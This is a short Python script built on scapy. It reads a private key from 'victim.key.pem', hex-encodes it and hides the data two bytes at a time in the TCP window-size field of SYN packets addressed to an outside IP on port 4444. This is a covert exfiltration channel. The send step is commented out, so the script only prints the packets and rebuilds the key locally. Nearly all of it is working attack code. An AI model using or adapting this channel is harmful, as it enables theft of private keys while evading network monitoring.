#!/usr/bin/env python3
from scapy.all import *


def reconstruct_hex_string(packets):
    reconstructed_hex_string = ""
    for p in packets:
        window_hex = str(format(p.window, "04x"))
        w1 = window_hex[:2]
        w2 = window_hex[2:]
        final = ""
        if w1 != "00":
            final += w1
        final += w2
        reconstructed_hex_string += final
    return reconstructed_hex_string


def ser_data(data):
    return victim_key.encode("utf-8").hex()


def deser_data(data):
    bytes_obj = bytes.fromhex(data)
    return bytes_obj.decode("ASCII")


def chunk(data):
    chunk_len = 4
    return [data[i : i + chunk_len] for i in range(0, len(data), chunk_len)]


if __name__ == "__main__":
    with open("victim.key.pem", "r") as f:
        victim_key = f.read()

    # Serialize into hex
    hex_string = ser_data(victim_key)
    print(hex_string)

    # Chunk it into two-byte chunks
    # TCP receive window size field is two bytes in length
    chunks = chunk(hex_string)

    # print(len(chunks))

    # victim_key2 = deser_data(hex_string)

    # Create custom SYN packets
    packets = []
    for chunk in chunks:
        window_size = int(chunk, 16)
        p = IP(dst="162.243.79.201") / TCP(dport=4444, window=window_size)
        packets.append(p)

    # for p in packets:
    # send(p)
    for p in packets:
        print(p.window, str(format(p.window, "04x")))

    reconstructed_hex_string = reconstruct_hex_string(packets)

    # print(reconstructed_hex_string)
    assert hex_string == reconstructed_hex_string
    reconstructed_victim_key = deser_data(reconstructed_hex_string)

    print(reconstructed_victim_key)
